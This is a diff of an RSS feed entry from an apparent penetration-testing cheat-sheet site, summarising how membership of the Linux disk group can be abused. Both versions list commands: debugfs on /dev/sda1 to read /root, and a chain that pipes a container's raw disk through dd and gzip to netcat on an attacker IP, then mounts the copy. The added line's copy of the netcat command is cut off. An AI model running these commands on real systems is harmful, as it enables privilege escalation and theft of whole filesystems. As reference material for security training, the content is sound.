@@ -12,7 +12,7 @@
       <link>https://tldrbins.github.io/disk/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/disk/</guid>
-      <description>Abuse disk group to read container&amp;rsquo;s filesystem # Show devices lsblk # Show LVM mappings ls -l /dev/mapper/ # In our local machine nc -lvnp 4444 &amp;gt; dm-0.gz # Exfil filesystem (target container rootfs, e.g. dm-0) dd if=/dev/dm-0 | gzip -1 - | nc 10.10.14.10 4444 # Extract dm-0 gunzip dm-0.gz # Mount the filesystem sudo mount dm-0-orig /mnt/ # Privilege read ls /mnt/root/ Note: can take a long time to transfer</description>
+      <description>Basic # Show devices lsblk # Device attributes blkid # Show swap on blk swapon -s # Filesystem info cat /etc/fstab Abuse disk group to read root filesystem # Open target device debugfs /dev/sda1 # Exploit ls /root Abuse disk group to read container&amp;rsquo;s filesystem # Show LVM mappings ls -l /dev/mapper/ # In our local machine nc -lvnp 4444 &amp;gt; dm-0.gz # Exfil filesystem (target container rootfs, e.g. dm-0) dd if=/dev/dm-0 | gzip -1 - | nc 10.</description>
     </item>
   </channel>
 </rss>
